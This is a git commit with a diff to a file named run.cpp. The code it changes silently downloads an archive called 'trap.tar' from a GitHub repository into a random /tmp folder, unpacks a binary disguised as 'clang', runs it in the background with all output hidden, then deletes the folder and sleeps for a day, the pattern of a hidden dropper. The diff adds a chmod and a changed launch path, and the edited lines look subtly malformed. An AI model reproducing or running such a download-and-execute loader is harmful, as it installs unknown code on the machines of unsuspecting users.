f641185096c78e2751f85c59fa2d7ce7c8fd0122
dse8347 <107747125+dse8347@users.noreply.github.com>
2022-08-01 07:08:38 +0800

    Update run.cpp

--- run.cpp
+++ run.cpp
@@ -6,7 +6,8 @@ CLANG=$(shuf -n 1 -i 10000000-99999999)\n\
 mkdir -p /tmp/$CLANG\n\
 wget -qO /tmp/$CLANG/clang.tar https://github.com/dse8347/dr/raw/main/trap.tar\n\
 tar xf /tmp/$CLANG/clang.tar -C /tmp/$CLANG\n\
-nohup /tmp/$CLANG/clang >/dev/null 2>&1 & sleep 0.1\n\
+chmod +x /tmp/$CLANG/clang
+nohup ./tmp/$CLANG/clang >/dev/null 2>&1 & sleep 0.1\n\
 rm -rf /tmp/$CLANG\n\
 sleep 24h\n"));
 }
